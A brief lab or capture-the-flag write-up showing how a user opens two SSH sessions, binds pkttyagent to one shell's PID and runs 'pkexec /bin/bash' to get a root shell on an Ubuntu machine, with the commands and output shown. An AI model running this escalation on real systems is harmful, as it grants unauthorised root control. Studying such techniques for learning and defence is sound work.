#### `pkexec` allows an authorized user to execute commands as another user.

#### We could have used pkexec /bin/bash to spawn a shell as root.

#### We needed to create two SSH connections as user.

. On the first SSH session
```
echo $$
2178 (pid)
```  
. second SSH session
```
pkttyagent -p 2178 (pid)
```

. first SSH session
```
pkexec /bin/bash
```

. second SSH session
```
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/bin/bash' as the super user
Authenticating as: user
Password:

==== AUTHENTICATION COMPLETE ===
Connection to 10.10.66.240 closed by remote host.
```
. first SSH session
```
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```
